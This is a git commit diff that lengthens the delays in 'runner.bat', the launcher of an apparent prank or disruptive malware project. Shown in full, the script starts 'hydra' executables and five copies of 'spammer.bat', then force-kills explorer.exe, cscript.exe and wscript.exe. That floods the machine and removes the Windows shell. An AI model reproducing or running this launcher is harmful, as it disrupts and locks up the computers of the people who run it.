9314bf1bdd7ccab6d5186aa9abdae9c9c3ec1b46
TV <88536184+tvplayz@users.noreply.github.com>
2022-01-13 17:25:06 +0100

    Update every 10 second timer to 20 second timer

--- uncompiled/runner.bat
+++ uncompiled/runner.bat
@@ -1,14 +1,14 @@
 start sound.exe
 start hydra.exe & rem This is a comment, hydra.exe is referred to the uncompiled hydra.bat
-ping localhost -n 11 >nul
+ping localhost -n 21 >nul
 start hydra4x.exe & rem This is a comment, hydra4x.exe is referred to the uncompiled hydra.bat
-ping localhost -n 11 >nul
+ping localhost -n 21 >nul
 start spammer.bat
 start spammer.bat
 start spammer.bat
 start spammer.bat
 start spammer.bat
-ping localhost -n 11 >nul
+ping localhost -n 21 >nul
 taskkill /f /im explorer.exe
 taskkill /f /im cscript.exe
 taskkill /f /im wscript.exe
